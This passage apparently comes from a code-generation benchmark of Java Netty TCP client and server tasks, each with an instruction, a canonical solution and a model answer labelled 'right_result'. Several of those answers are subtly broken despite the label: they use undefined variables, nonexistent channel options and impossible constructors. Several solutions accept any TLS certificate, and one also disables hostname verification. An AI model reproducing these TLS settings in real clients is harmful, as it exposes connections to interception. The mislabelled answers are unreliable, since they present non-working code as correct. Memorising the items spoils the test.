    "Canonical_solution": "import com.github.dockerjava.core.DockerClientConfig;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelConfig;\nimport io.netty.channel.ChannelFactory;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DuplexChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContentDecompressor;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultThreadFactory;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketTimeoutException;\nimport java.security.Security;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.SSLParameters;\n\npublic class NettyTcpClient {\n\n    private static String threadPrefix = \"dockerjava-netty\";\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n    private Integer connectTimeout;\n    private Integer readTimeout;\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        bootstrap = new Bootstrap();\n        eventLoopGroup = new NioEventLoopGroup(0, new DefaultThreadFactory(threadPrefix));\n\n        InetAddress addr = InetAddress.getLoopbackAddress();\n        final SocketAddress proxyAddress = new InetSocketAddress(addr, 8008);\n\n        Security.addProvider(new BouncyCastleProvider());\n\n        ChannelFactory<NioSocketChannel> factory = () -> configure(new NioSocketChannel());\n\n        bootstrap.group(eventLoopGroup).channelFactory(factory)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(final SocketChannel channel) throws Exception {\n                        channel.pipeline().addLast(new HttpClientCodec());\n                        channel.pipeline().addLast(new HttpContentDecompressor());\n                    }\n                });\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws InterruptedException {\n        String host = dockerClientConfig.getDockerHost().getHost();\n        int port = dockerClientConfig.getDockerHost().getPort();\n\n        if (port == -1) {\n            throw new RuntimeException(\"no port configured for \" + host);\n        }\n\n        final DuplexChannel channel = (DuplexChannel) bootstrap.connect(host, port).sync().channel();\n\n        final SslHandler ssl = initSsl(dockerClientConfig);\n\n        if (ssl != null) {\n            channel.pipeline().addFirst(ssl);\n            ssl.sslCloseFuture().addListener(future -> channel.eventLoop().execute(channel::close));\n        }\n\n        return channel;\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        SslHandler ssl = null;\n\n        try {\n            String host = dockerClientConfig.getDockerHost().getHost();\n            int port = dockerClientConfig.getDockerHost().getPort();\n\n            final SSLConfig sslConfig = dockerClientConfig.getSSLConfig();\n\n            if (sslConfig != null && sslConfig.getSSLContext() != null) {\n                SSLEngine engine = sslConfig.getSSLContext().createSSLEngine(host, port);\n                engine.setUseClientMode(true);\n                engine.setSSLParameters(enableHostNameVerification(engine.getSSLParameters()));\n                ssl = new SslHandler(engine);\n            }\n\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        return ssl;\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public void close() throws IOException {\n        Objects.requireNonNull(eventLoopGroup, \"Factory not initialized. You probably forgot to call init()!\");\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private <T extends Channel> T configure(T channel) {\n        ChannelConfig channelConfig = channel.config();\n\n        if (connectTimeout != null) {\n            channelConfig.setConnectTimeoutMillis(connectTimeout);\n        }\n        if (readTimeout != null) {\n            channel.pipeline().addLast(\"readTimeoutHandler\", new ReadTimeoutHandler());\n        }\n\n        return channel;\n    }\n\n    private final class ReadTimeoutHandler extends IdleStateHandler {\n        private boolean alreadyTimedOut;\n\n        ReadTimeoutHandler() {\n            super(readTimeout, 0, 0, TimeUnit.MILLISECONDS);\n        }\n\n        @Override\n        protected synchronized void channelIdle(ChannelHandlerContext ctx, IdleStateEvent evt) throws Exception {\n            assert evt.state() == IdleState.READER_IDLE;\n            final Channel channel = ctx.channel();\n            if (channel == null || !channel.isActive() || alreadyTimedOut) {\n                return;\n            }\n            DockerClientConfig dockerClientConfig = getDockerClientConfig();\n            final Object dockerAPIEndpoint = dockerClientConfig.getDockerHost();\n            final String msg = \"Read timed out: No data received within \" + readTimeout\n                    + \"ms.  Perhaps the docker API (\" + dockerAPIEndpoint\n                    + \") is not responding normally, or perhaps you need to increase the readTimeout value.\";\n            final Exception ex = new SocketTimeoutException(msg);\n            ctx.fireExceptionCaught(ex);\n            alreadyTimedOut = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.timeout.ReadTimeoutHandler;\n\nimport javax.net.ssl.SSLException;\nimport javax.net.ssl.SSLParameters;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyTcpClient {\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n    private int connectTimeout;\n    private int readTimeout;\n    private String threadPrefix;\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        this.connectTimeout = dockerClientConfig.getConnectTimeout();\n        this.readTimeout = dockerClientConfig.getReadTimeout();\n        this.threadPrefix = dockerClientConfig.getThreadPrefix();\n\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap()\n                .group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws InterruptedException, SSLException {\n        SslHandler sslHandler = initSsl(dockerClientConfig);\n        ChannelFuture future = bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(\"ssl\", sslHandler);\n                pipeline.addLast(\"timeout\", new ReadTimeoutHandler(readTimeout, TimeUnit.MILLISECONDS));\n                pipeline.addLast(\"handler\", new DockerChannelHandler());\n            }\n        }).connect(dockerClientConfig.getHost(), dockerClientConfig.getPort());\n\n        if (!future.await(connectTimeout, TimeUnit.MILLISECONDS)) {\n            throw new RuntimeException(\"Connection timed out\");\n        }\n\n        return new DuplexChannel(future.channel());\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) throws SSLException {\n        SslContext sslContext = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n        SSLParameters sslParameters = new SSLParameters();\n        sslParameters.setEndpointIdentificationAlgorithm(null);\n        return sslContext.newHandler(bootstrap.config().group().next().next(), dockerClientConfig.getHost(), dockerClientConfig.getPort(), enableHostNameVerification(sslParameters));\n    }\n\n    private SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        // Custom implementation to enable hostname verification if needed\n        return sslParameters;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public <T extends Channel> T configure(T channel) {\n        channel.config().setOption(ChannelOption.CONNECT_TIMEOUT_MILLIS, connectTimeout);\n        channel.config().setOption(ChannelOption.READ_TIMEOUT_MILLIS, readTimeout);\n        return channel;\n    }\n\n    static class ReadTimeoutHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent && ((IdleStateEvent) evt).state() == IdleState.READER_IDLE) {\n                ctx.close();\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 156,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish secure or non-secure connections to a remote server, with capabilities for graceful shutdown.\n\nClass Description: The HttpUploadClient class provides functionality to create and manage a Netty-based TCP client that can connect to a specified host and port, with optional SSL/TLS encryption. It handles connection establishment, channel management, and resource cleanup.\n\nAttributes:\n- host: [String] - The hostname or IP address of the remote server to connect to\n- port: [int] - The port number of the remote server\n- ssl: [boolean] - Flag indicating whether SSL/TLS encryption should be used\n- sslCtx: [SslContext] - Netty's SSL context for secure connections (null if ssl is false)\n- group: [EventLoopGroup] - Netty event loop group for managing I/O operations\n- bootstrap: [Bootstrap] - Netty bootstrap for configuring client connection parameters\n\nMethods:\n- HttpUploadClient(String host, int port, boolean ssl) -> [Constructor] - Initializes the client with connection parameters and SSL configuration if needed\n- connect() -> [Channel] - Establishes a connection to the remote server and returns the communication channel\n- shutdown() -> [void] - Shuts down the client gracefully and releases all resources\n- main(String[] args) -> [void] - Example usage demonstrating client initialization, connection, and shutdown",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.util.internal.SocketUtils;\n\npublic class HttpUploadClient {\n\n    private final String host;\n    private final int port;\n    private final boolean ssl;\n    private final SslContext sslCtx;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n\n    public HttpUploadClient(String host, int port, boolean ssl) throws Exception {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n        \n        if (ssl) {\n            this.sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            this.sslCtx = null;\n        }\n\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new HttpUploadClientInitializer(sslCtx));\n    }\n\n    public Channel connect() throws InterruptedException {\n        ChannelFuture future = bootstrap.connect(SocketUtils.socketAddress(host, port));\n        return future.sync().channel();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        String host = \"127.0.0.1\";\n        int port = 8080;\n        boolean ssl = false;\n\n        HttpUploadClient client = new HttpUploadClient(host, port, ssl);\n        try {\n            Channel channel = client.connect();\n            // Perform operations with the channel here\n        } finally {\n            client.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class HttpUploadClient {\n    private String host;\n    private int port;\n    private boolean ssl;\n    private SslContext sslCtx;\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n\n    public HttpUploadClient(String host, int port, boolean ssl) {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n        if (ssl) {\n            try {\n                sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                        .build();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to initialize SSL context\", e);\n            }\n        }\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (ssl) {\n                            pipeline.addLast(sslCtx.newHandler(ch.alloc()));\n                        }\n                        // Add other handlers as needed\n                    }\n                });\n    }\n\n    public Channel connect() throws InterruptedException {\n        return bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void shutdown() {\n        if (bootstrap != null) {\n            bootstrap.config().group().shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        HttpUploadClient client = new HttpUploadClient(\"example.com\", 8080, true);\n        try {\n            Channel channel = client.connect();\n            System.out.println(\"Connected to \" + client.host + \":\" + client.port);\n            // Perform operations on the channel\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            client.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: The MyClient class represents a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\n- run: run() -> void - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Periodically sends message objects containing Chinese poetry\n  4. Handles graceful shutdown of network resources\n  5. Throws InterruptedException if interrupted during operation",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"codec\", new MyCodec());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MyClient {\n    private final String host;\n    private final int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new ClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (!Thread.currentThread().isInterrupted()) {\n                ByteBuf message = channel.alloc().buffer();\n                message.writeBytes(\"\u9759\u591c\u601d\u4e61\uff0c\u6708\u660e\u5982\u7ec3\u3002\".getBytes());\n                channel.writeAndFlush(message);\n                Thread.sleep(5000); // Send every 5 seconds\n            }\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + MyClient.class.getSimpleName() + \" <host> <port>\");\n            return;\n        }\n\n        new MyClient(args[0], Integer.parseInt(args[1])).run();\n    }\n\n    private static class ClientHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            // Handle received data if needed\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 158,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle network communication, and manage resources properly.\n\nClass Description: The TimeClient class represents a Netty-based TCP client that connects to a specified host and port. It manages network connections asynchronously using Netty's event-driven architecture and provides methods to start and stop the client connection.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n- workerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\n- bootstrap: Bootstrap - Netty's bootstrap for configuring and starting the client\n\nMethods:\n- TimeClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the client connection, configures the pipeline, and connects to the server\n- stop() -> void - Shuts down the client connection gracefully and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup);\n            bootstrap.channel(NioSocketChannel.class);\n            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new TimeClientHandler());\n                }\n            });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n                .group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start() throws Exception {\n        ChannelFuture f = bootstrap.connect(host, port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 159,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle SSL/TLS if required, and process incoming/outgoing messages.\n\nClass Description: DiscardClient is a Netty-based TCP client that connects to a specified server, optionally with SSL/TLS encryption, and handles network communication through a custom handler. The client manages resources efficiently and supports graceful shutdown.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL/TLS encryption should be used\n- HOST: String - The hostname or IP address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server to connect to (default: 8009)\n- SIZE: int - The size parameter for communication (default: 256)\n- sslCtx: SslContext - SSL context for secure connections (nullable)\n\nMethods:\n- main(String[] args) -> void - Entry point that initializes the client, establishes connection, and manages the client lifecycle\n  - args: String[] - Command line arguments (unused in current implementation)\n- initChannel(SocketChannel ch) -> void - Configures the channel pipeline with SSL handler (if enabled) and custom client handler\n  - ch: SocketChannel - The socket channel to be initialized\n- connect() -> ChannelFuture - Establishes connection to the remote server and returns future for connection status\n- shutdown() -> void - Shuts down the client gracefully and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class DiscardClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new DiscardClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class DiscardClient {\n    private static final boolean SSL = false;\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8009;\n    private static final int SIZE = 256;\n    private SslContext sslCtx = null;\n\n    public static void main(String[] args) throws Exception {\n        DiscardClient client = new DiscardClient();\n        try {\n            client.initSSL();\n            client.connect().sync().channel().closeFuture().sync();\n        } finally {\n            client.shutdown();\n        }\n    }\n\n    private void initSSL() throws Exception {\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        }\n    }\n\n    private ChannelFuture connect() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new DiscardClientHandler(SIZE));\n                 }\n             });\n\n            return b.connect(HOST, PORT);\n        } catch (Exception e) {\n            group.shutdownGracefully();\n            throw e;\n        }\n    }\n\n    private void shutdown() {\n        // Implement graceful shutdown logic here\n    }\n}\n\nclass DiscardClientHandler extends SimpleChannelInboundHandler<String> {\n    private final int size;\n\n    public DiscardClientHandler(int size) {\n        this.size = size;\n    }\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        // Handle incoming message\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP server using Netty framework to handle WebSocket connections, manage client protocols, and process various commands and binary messages.\n\nClass Description: LocalServer is a Netty-based TCP server that handles WebSocket connections, manages client protocols, and processes text/binary messages. It maintains a list of active protocols and delegates command execution to connected clients.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - Maintains active client protocols and their associated connections\n- logger: Logger - Logging instance for server events and errors\n\nMethods:\n- LocalServer(int port) -> void - Constructor that initializes the server with specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server with boss/worker groups, configures channel options and handlers, and binds to the specified port\n- LocalServerWebsocketEventImp (inner class) - Handles WebSocket events including connection, disconnection, and message processing\n\nLocalServerWebsocketEventImp Methods:\n- onConnect(ChannelHandlerContext ctx) -> void - Handles new WebSocket connections\n- onDisconnect(ChannelHandlerContext ctx) -> void - Handles client disconnections and cleans up associated protocols\n- onTextMessage(ChannelHandlerContext ctx, String text) -> void - Processes incoming text messages and executes corresponding commands\n- onBinaryMessage(ChannelHandlerContext ctx, byte[] data) -> void - Handles binary file uploads and processes file chunks\n- initLocalClient(ChannelHandlerContext ctx, Command command) -> void - Initializes a new client protocol for device communication\n- executeCommand(ChannelHandlerContext ctx, Command command) -> void - Executes commands on the appropriate protocol instance",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport com.yeetor.androidcontrol.client.LocalClient;\nimport com.yeetor.androidcontrol.message.BinaryMessage;\nimport com.yeetor.androidcontrol.message.FileMessage;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.apache.log4j.Logger;\n\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class LocalServer extends BaseServer {\n    private static Logger logger = Logger.getLogger(LocalServer.class);\n    \n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public LocalServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup).\n                channel(NioServerSocketChannel.class).\n                childOption(ChannelOption.SO_KEEPALIVE, true).\n                childHandler(new ChildChannel(new LocalServerWebsocketEventImp()));\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private class LocalServerWebsocketEventImp extends WebsocketEvent {\n\n        @Override\n        public void onConnect(ChannelHandlerContext ctx) {\n            logger.info(\"Websocket new connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                    protocol.broswerDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n\n                if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                    protocol.clientDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n            }\n            logger.info(\"Websocket lost connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = Command.ParseCommand(text);\n            if (command != null) {\n                switch (command.getSchem()) {\n                    case WAIT:\n                        initLocalClient(ctx, command);\n                        break;\n                    case START:\n                    case WAITTING:\n                    case TOUCH:\n                    case KEYEVENT:\n                    case INPUT:\n                    case PUSH:\n                        executeCommand(ctx, command);\n                        break;\n                    case SHOT:\n                        sendShot(ctx, command);\n                        break;\n                    case DEVICES:\n                        sendDevicesJson(ctx);\n                        break;\n                }\n            